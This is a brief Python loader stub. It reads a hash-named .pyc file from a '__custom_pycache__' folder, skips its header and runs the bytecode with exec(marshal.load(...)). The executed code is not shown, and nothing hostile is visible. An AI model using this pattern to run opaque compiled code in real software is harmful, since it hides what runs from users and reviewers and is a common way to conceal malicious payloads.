
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'WebApp_Reco_86e6978e484746e2a5bdce45b5966ade.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
